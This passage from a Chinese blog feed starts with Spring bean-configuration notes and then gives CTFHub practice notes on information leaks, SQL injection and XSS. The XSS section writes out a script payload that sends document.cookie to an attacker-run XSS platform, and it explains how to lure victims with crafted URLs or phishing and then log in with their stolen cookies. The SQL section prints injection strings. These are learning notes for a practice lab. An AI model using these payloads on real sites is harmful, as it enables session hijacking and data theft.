class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>重点要引入xml的约束</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</span><br></pre></td></tr></table></figure>

<h4 id="4-c命名空间"><a href="#4-c命名空间" class="headerlink" title="4. c命名空间"></a>4. c命名空间</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:c</span>=<span class="string">&quot;http://www.springframework.org/schema/c&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    &lt;bean id=&quot;user&quot; class=&quot;com.pojo.User&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;property name=&quot;name&quot; value=&quot;ajnuy&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;property name=&quot;age&quot; value=&quot;20&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/bean&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    与上述写法相同，简化写法--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.User&quot;</span> <span class="attr">p:name</span>=<span class="string">&quot;ajnuy&quot;</span> <span class="attr">p:age</span>=<span class="string">&quot;20&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    &lt;bean id=&quot;user2&quot; class=&quot;com.pojo.User&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;constructor-arg name=&quot;name&quot; value=&quot;ajnuy&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;constructor-arg name=&quot;age&quot; value=&quot;23&quot;/&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;/bean&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    与上述写法相同，简化写法--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.User&quot;</span> <span class="attr">c:name</span>=<span class="string">&quot;AJNUY&quot;</span> <span class="attr">c:age</span>=<span class="string">&quot;20&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>重点还是引入约束</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">xmlns:c=&quot;http://www.springframework.org/schema/c&quot;</span><br></pre></td></tr></table></figure>



<h3 id="7-bean的作用域（scope）"><a href="#7-bean的作用域（scope）" class="headerlink" title="7. bean的作用域（scope）"></a>7. bean的作用域（scope）</h3><h4 id="1-单例模式（默认机制）"><a href="#1-单例模式（默认机制）" class="headerlink" title="1. 单例模式（默认机制）"></a>1. 单例模式（默认机制）</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.User&quot;</span> <span class="attr">c:name</span>=<span class="string">&quot;AJNUY&quot;</span> <span class="attr">c:age</span>=<span class="string">&quot;20&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;singleton&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>所有getBean()拿到的对象是同一个对象</p>
<h4 id="2-原型对象"><a href="#2-原型对象" class="headerlink" title="2. 原型对象"></a>2. 原型对象</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.User&quot;</span> <span class="attr">c:name</span>=<span class="string">&quot;AJNUY&quot;</span> <span class="attr">c:age</span>=<span class="string">&quot;20&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>每次通过getBean()拿到的对象都是不同的</p>
<h4 id="3-其他"><a href="#3-其他" class="headerlink" title="3. 其他"></a>3. 其他</h4><p>request, session, application，均用于web开发中</p>
<h3 id="8-bean的自动装配（autowire）"><a href="#8-bean的自动装配（autowire）" class="headerlink" title="8. bean的自动装配（autowire）"></a>8. bean的自动装配（autowire）</h3><ul>
<li>spring可以使用自动装配来满足bean的依赖要求</li>
<li>spring会在上下文中自动寻找，并且自动地给bean配置属性</li>
</ul>
<h4 id="1-spring的三种装配方式"><a href="#1-spring的三种装配方式" class="headerlink" title="1. spring的三种装配方式"></a>1. spring的三种装配方式</h4><ul>
<li>xml中显式配置（一般常用）</li>
<li>java中显式配置</li>
<li>隐式的自动配置bean</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    byName:会在容器的上下文中（此处为people容器）寻找，和自己的属性名称相同的bean（people的两个属性为cat和dog，因此会装配id为cat和dog的两个bean），</span></span><br><span class="line"><span class="comment">    实现自动装配</span></span><br><span class="line"><span class="comment">    byType:会在容器的上下文中（此处为people容器）寻找，和自己的属性名称相同的bean（people的两个属性类型为Cat和Dog，因此会装配class为Cat和Dog的两个bean），</span></span><br><span class="line"><span class="comment">    实现自动装配</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;people&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.pojo.People&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ajnuy&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><em>注意：使用byName时要保证所有的bean的id唯一，且id要和对应的属性名称一致；使用byType时要保证所有bean的class唯一，且class要和对应的属性类型一致</em></p>
<h4 id="2-使用注解自动装配"><a href="#2-使用注解自动装配" class="headerlink" title="2. 使用注解自动装配"></a>2. 使用注解自动装配</h4><p>使用注解的要求：</p>
<ol>
<li>导入约束：context约束</li>
<li>配置依赖</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context 					  		</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="1-Autowired"><a href="#1-Autowired" class="headerlink" title="1. @Autowired"></a>1. @Autowired</h5><p>可以直接在属性上使用，亦可以在set方法上使用</p>
<p>使用@Autowired后可以不用写set方法了，但是该属性应该已经提前在容器中存在了，且要符合名字</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Cat <span class="title function_">getCat</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    @Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCat</span><span class="params">(Cat cat)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cat = cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    @Autowired</span></span><br><span class="line">    <span class="keyword">public</span> Dog <span class="title function_">getDog</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDog</span><span class="params">(Dog dog)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dog = dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;People&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, cat=&quot;</span> + cat +</span><br><span class="line">                <span class="string">&quot;, dog=&quot;</span> + dog +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果装配的环境比较复杂，使用单一的@Autowired无法完成时，可以使用@Qualifier(value&#x3D;”某个bean的id”)进行配置，以指定一个唯一的bean容器</p>
<p>补充：@Nullable：打上该注解，表明该字段可以为空</p>
<h3 id="9-使用注解开发"><a href="#9-使用注解开发" class="headerlink" title="9. 使用注解开发"></a>9. 使用注解开发</h3><h4 id="1-Autowired和-Qualifier-value-x3D-”xxx”"><a href="#1-Autowired和-Qualifier-value-x3D-”xxx”" class="headerlink" title="1. @Autowired和@Qualifier(value&#x3D;”xxx”)"></a>1. @Autowired和@Qualifier(value&#x3D;”xxx”)</h4><p>上面已经详细讲述，此处不多赘述</p>
<h4 id="2-Nullable"><a href="#2-Nullable" class="headerlink" title="2. @Nullable"></a>2. @Nullable</h4><p>表示某个字段可以为空</p>
<h4 id="3-Component"><a href="#3-Component" class="headerlink" title="3. @Component"></a>3. @Component</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">//相当于&lt;bean id=&quot;user&quot; class=&quot;com.pojo.User&quot;/&gt;</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    等价于&lt;property name=&quot;name&quot; value=&quot;ajnuy&quot;/&gt;</span></span><br><span class="line">    <span class="meta">@Value(&quot;ajnuy&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一般使用在具体的实体类中，加上该注解会让spring进行自动装载到容器中</p>
<p>但是要提前在xml文件中加上</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    自动扫描指定包，查看是否存在组件，若是存在，便加入bean进行管理--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.pojo&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<p>@Component的几个衍生注解:采用MVC三层架构</p>
<ul>
<li>dao：@Repository</li>
<li>service：@Service</li>
<li>controller：@Controller</li>
</ul>
<p>四个注解（加上@Component）的功能是一样的，都是将某个类注册到spring中，并进行装配</p>
<h4 id="4-singleton-“xxx”"><a href="#4-singleton-“xxx”" class="headerlink" title="4. @singleton(“xxx”)"></a>4. @singleton(“xxx”)</h4><p>相当于scope&#x3D;”singleton”</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<p>title: ctfhub刷题心得<br>date: 2023-9-25 21:56:41<br>tags: [ctfhub, ctf]<br>categories: [ctfhhub刷题]</p>
<h1 id="1-web"><a href="#1-web" class="headerlink" title="1. web"></a>1. web</h1><h2 id="1-前置技能"><a href="#1-前置技能" class="headerlink" title="1. 前置技能"></a>1. 前置技能</h2><h3 id="1-http协议"><a href="#1-http协议" class="headerlink" title="1. http协议"></a>1. http协议</h3><h4 id="1-请求方式"><a href="#1-请求方式" class="headerlink" title="1. 请求方式"></a>1. 请求方式</h4><p>HTTP 请求方法, HTTP&#x2F;1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。</p>
<span id="more"></span>



<h4 id="2-302跳转"><a href="#2-302跳转" class="headerlink" title="2. 302跳转"></a>2. 302跳转</h4><p>301跳转是指页面永久性移走(永久跳转)，通常叫做301跳转，也叫 301重定向 ，301转向。301跳转多用于旧网址在废弃前转向新网址以保证用户的访问，在诸多服务器中，均支持本跳转方法。</p>
<p>302重定向又称之为暂时性转移(临时跳转)，英文名称：302 redirect。 也被认为是暂时重定向 ，一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。</p>
<ul>
<li>比如一个portal页面，换了新的域名，但是老的域名地址还有很多用户在使用，这样可以对老域名配置302跳转到新域名地址，保证服务的延续。</li>
<li>另外对于一些客户端预埋的Url链接，免不了老版本地址失效与更改，将老地址配置302跳转到新地址，这样就能够全面兼容所有客户端版本。</li>
</ul>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230722195004196.png" alt="image-20230722195004196"></p>
<h4 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h4><h1 id="2-信息泄露"><a href="#2-信息泄露" class="headerlink" title="2. 信息泄露"></a>2. 信息泄露</h1><h2 id="1-目录遍历"><a href="#1-目录遍历" class="headerlink" title="1. 目录遍历"></a>1. 目录遍历</h2><h2 id="2-phpinfo"><a href="#2-phpinfo" class="headerlink" title="2. phpinfo"></a>2. phpinfo</h2><h2 id="3-备份文件下载"><a href="#3-备份文件下载" class="headerlink" title="3. 备份文件下载"></a>3. 备份文件下载</h2><h3 id="1-网站源码"><a href="#1-网站源码" class="headerlink" title="1. 网站源码"></a>1. 网站源码</h3><h3 id="2-bak文件"><a href="#2-bak文件" class="headerlink" title="2. bak文件"></a>2. bak文件</h3><h3 id="3-vim缓存"><a href="#3-vim缓存" class="headerlink" title="3. vim缓存"></a>3. vim缓存</h3><p>当我们使用vim或者vi编辑文件时，出现不正常的情况（多个程序编辑同一个文件），系统会产生一个.(flilename).swp文件，我们在网站中访问该文件，便可以拿到网站的源码</p>
<h3 id="4-DS-Store"><a href="#4-DS-Store" class="headerlink" title="4. .DS_Store"></a>4. .DS_Store</h3><h3 id="4-git"><a href="#4-git" class="headerlink" title="4. git"></a>4. git</h3><h4 id="1-log"><a href="#1-log" class="headerlink" title="1. log"></a>1. log</h4><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724101810666.png" alt="image-20230724101810666"></p>
<p>没做出来，呜呜呜</p>
<h3 id="5-svn泄露"><a href="#5-svn泄露" class="headerlink" title="5. svn泄露"></a>5. svn泄露</h3><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
<p>我们也需要使用一个工具来利用svn泄露——dvcs-ripper，安装教程：<a href="https://blog.csdn.net/Barlow_121212/article/details/120491567">(22条消息) dvcs-ripper安装教程_海滩丨长颈鹿的博客-CSDN博客</a></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724141207580.png" alt="image-20230724141207580"></p>
<p>执行命令</p>
<img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724141119351.png" alt="image-20230724141119351" style="zoom:150%;">

<p>查看到flag</p>
<h3 id="6-hg泄露"><a href="#6-hg泄露" class="headerlink" title="6. hg泄露"></a>6. hg泄露</h3><p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞</p>
<img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724142806792.png" alt="image-20230724142806792" style="zoom:150%;">

<p>执行命令</p>
<img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724142857455.png" alt="image-20230724142857455" style="zoom:150%;">

<p>找到一个类似的flag文件，但是我在下载下的文件夹里翻半天也没发现，那我直接尝试使用该文件直接在网站访问</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230724143057762.png" alt="image-20230724143057762"></p>
<p>成功找到</p>
<h2 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3. SQL注入"></a>3. SQL注入</h2><h3 id="1-整数型注入"><a href="#1-整数型注入" class="headerlink" title="1. 整数型注入"></a>1. 整数型注入</h3><p>除了手工注入外，我们还可以使用sqlmap这个渗透工具。<a href="https://sqlmap.org/">sqlmap是一款开源的渗透测试工具，它可以自动化地检测和利用SQL注入漏洞，从而获取数据库服务器的控制权。</a>通过具体的使用，其使用确实要比手工注入要更方便快捷，使用–current-db，–tables，–columns等几个命令便可以较为简单的拿到数据库的有关信息。</p>
<p>在手工注入中，我们需要知道几个信息，MySQL的数据库中一般都会有一个information_schema这样的一个数据库，其中一般都会存放一些关于mysql数据库的相关信息。我们可以从其中的tables，columns表中找到我们想要的表名和列名。</p>
<p>在进行sql注入时，一般的步骤都是：</p>
<p>①判断注入点：比如我们可以在填写的信息后添加上” and 1 &#x3D; 1”这样的条件进行判断是否存在注入点。</p>
<p>②判断列数：我们可以使用“order by number”来判断到底有几列。</p>
<p>③拿到数据库名：sqlmap我们可以使用命令–current-db，而手工注入就要使用联合查询和database()函数。</p>
<p>④拿到表名：sqlmap可以使用–tables命令，手工注入使用联合查询从information_schema.tables这张表中拿到表名。</p>
<p>⑤拿到列名：sqlmap可以使用–columns命令，手工注入使用联合查询从information_schema.columns表中拿到列名。</p>
<p>⑥从想要的表中拿到数据：根据上述拿到的数据库名，表名，列名拿到数据。</p>
<h3 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2. 字符型注入"></a>2. 字符型注入</h3><p>对于字符串注入，当我们注入的值为1时，其运行的代码是</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，我们输入的内容被一串字符串包裹起来了，那么，我可以使用一些特殊字符串将其绕过。</p>
<p>我们可以输入 1’ order by 2;#，这样的输入，1后面的引号可以使得自带的前一个引号闭合，在语句的最后加上#，也就是将后面的内容注释掉，不会再执行这样的内容。</p>
<p>最后的执行代码是，</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3. 报错注入"></a>3. 报错注入</h3><p>主要使用一个updatexml()这样的一个方法。</p>
<p><strong>updatexml（）函数</strong></p>
<ul>
<li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li>
<li>作用：改变文档中符合条件的节点的值</li>
<li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如&#x2F;&#x2F;title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li>
<li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
<li>例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
</ul>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195417378.png" alt="image-20230807195417378"></p>
<p>当我们输入1时，没有任何问题，成功查询</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195508562.png" alt="image-20230807195508562"></p>
<p>出现报错信息，可以使用报错注入</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230807195745003.png" alt="image-20230807195745003"></p>
<p>拿到了数据库的名称</p>
<h1 id="4-XSS"><a href="#4-XSS" class="headerlink" title="4. XSS"></a>4. XSS</h1><p>1、明确cookie的作用<br>当你登录账号密码，服务端就会给你一个cookie，这样你在这个平台上的操作就带上了cookie来验证身份，而不用每一次操作都要你登录账号密码。cookie相当于每个人的登录凭证，如果得到了别人的cookie，特别是管理员的，我们将可以不用输账号密码，直接登录，从而获取管理员权限。</p>
<p>2、XSS的目的<br>获取别人的cookie。<br>Web渗透测试之XSS攻击：反射型XSS</p>
<p>获得cookie的方法：我们在有XSS漏洞的搜索栏中输入<script>alert(document.cookie)< /script>，但cookie只会在受害用户的浏览器中弹出，我们无法获得。</p>
<p>那该怎么办呢？</p>
<p>①在存在XSS漏洞的地方加上XSS：<script src=“<a href="http://127.0.0.1/xss/UYxzH8?1608472710/%E2%80%9D">http://127.0.0.1/xss/UYxzH8?1608472710/”</a> + document.cookie;> </script> (<a href="http://127.0.0.1/xss/UYxzH8?1608472710/">http://127.0.0.1/xss/UYxzH8?1608472710/</a> 为我们搭建的XSS平台)。</p>
<p>②接着构造虚假URL诱使受害用户点击：<a href="http://xxx/xx?abc=">http://xxx/xx?abc=</a>&lt;script src&#x3D;”<a href="http://127.0.0.1/xss/UYxzH8?1608472710/%E2%80%9D+document.cookie;%3E">http://127.0.0.1/xss/UYxzH8?1608472710/”+document.cookie;&gt;</a> 。就像上面那个蓝字链接，我诱使你们点击，然后你们的浏览器就会请求蓝字背后的链接。如果我把蓝字背后的链接换成<a href="http://xxx/xx?abc=">http://xxx/xx?abc=</a>&lt;script src&#x3D;”<a href="http://127.0.0.1/xss/UYxzH8?1608472710/%E2%80%9D+document.cookie;%3E">http://127.0.0.1/xss/UYxzH8?1608472710/”+document.cookie;&gt;</a> ，在你们点击后，你们的浏览器就会带上你们的cookie，访问<a href="http://127.0.0.1/xss/UYxzH8?1608472710/%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%9C%A8%E6%88%91%E6%89%80%E6%90%AD%E5%BB%BA%E7%9A%84%E5%B9%B3%E5%8F%B0%E6%97%A5%E5%BF%97%E4%B8%8A%E7%95%99%E4%B8%8B%E4%BD%A0%E4%BB%AC%E7%9A%84cookie%E3%80%82">http://127.0.0.1/xss/UYxzH8?1608472710/，从而在我所搭建的平台日志上留下你们的cookie。</a></p>
<p>③在用户点击后，只需查看我们所搭建平台的日志即可获得受害用户的cookie。在获得cookie之后就可以利用抓包工具修改请求包中的cookie，将其替换为受害用户的cookie即可登录受害用户的账号。而诱使用户点击虚假URL的方式有很多，如钓鱼邮件、特殊的图片或文本等。</p>
<h3 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1. 反射型"></a>1. 反射型</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/Users\AJNUY\AppData\Roaming\Typora\typora-user-images\image-20230818175801011.png" alt="image-20230818175801011"></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818175838535.png" alt="image-20230818175838535"></p>
<p>获取XSS反射代码</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818175917767.png" alt="image-20230818175917767"></p>
<p>访问到xss代码</p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230818180011029.png" alt="image-20230818180011029"></p>
<p>获取到flag</p>
<h1 id="5-RCE"><a href="#5-RCE" class="headerlink" title="5. RCE"></a>5. RCE</h1><h3 id="1-eval执行"><a href="#1-eval执行" class="headerlink" title="1. eval执行"></a>1. eval执行</h3><p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905161224097.png" alt="image-20230905161224097"></p>
<p>题目给出了php的代码，PHP代码显示，要求<strong>将命令赋值给cmd然后执行</strong></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905161446056.png" alt="image-20230905161446056"></p>
<p><strong>cmd命令的格式一点不能错，后面的分号不能省略</strong></p>
<p><img src="/2023/10/13/%E5%88%B7%E9%A2%98%E5%BF%83%E5%BE%97/image-20230905162137980.png" alt="image-20230905162137980"></p>
